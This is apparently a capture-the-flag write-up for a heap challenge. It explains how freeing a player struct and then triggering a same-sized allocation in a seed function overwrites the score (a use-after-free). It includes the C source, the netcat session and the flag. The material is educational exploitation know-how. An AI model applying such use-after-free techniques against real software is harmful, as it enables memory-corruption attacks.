# pwn/i forgor

This is a heap exploitation challenge meant to be solved with a use-after-free (uaf) exploit. 

There are 5 options:
1. Create player
2. Delete player
3. Check if player is a high scorer
4. Set player score
5. Re-generate random seed for score selection

Creating a player with option 1 `malloc`s 0x10 bytes of memory for the player, which has the following struct:
```c
struct playerInfo {
    char name[12];
    int score;
};
```

Once the name is set, we can now proceed with the `free` part of `use-after-free` and delete the player with option 2. 

The score will never be set above 200 by typical means, so we have to go an exploitative route. Since we have this (previously) player chunk free, any allocation that occurs with the same size will use the same memory. The only other time malloc is called outside of creating memory to read in the flag in the win condition is during the "random" seed generation function:

```c
int generateSeed() {
    int* numbers = (int*)malloc(0x10);
    if(!numbers) {
        printf("Could not allocate space for numbers!\n");
        exit(-1);
    }
    numbers[0] = 100;
    numbers[1] = 150;
    numbers[2] = 200;
    numbers[3] = 250;
    int choice = rand() % 4;
    return numbers[choice];
}
```

Here, another `0x10` bytes are allocated right on top of the previous player struct. Remember, the player struct had 12 bytes for the name and an int (4 bytes) for the score. So, you can imagine this next allocation and value assignment overwriting like this:
```c
struct playerInfo { //   numbers
    char name[12];  //   number[0], number[1], number[2]
    int score;      //   number[3]
}
```

So, after a new "random" seed has been selected with option 5, whatever was in `pi->score` is overwritten with `250`. 

Now, to get the flag all a user has to do is use option 3 to check their score:

```
$ nc challs.ctf.uahcyber.club 52760

==================================
Welcome to the random score giver!
==================================
1. Create player
2. Delete player
3. Check if player is a high scorer
4. Set player score
5. Re-generate random seed for score selection
Selection: 1
What is your name?: dayt0n
Set dayton's score to 44!
...
Selection: 2
...
Selection: 5
...
Selection: 3
flag: UAH{h3ap_exploitati0n_1s_actual1y_3Z}
```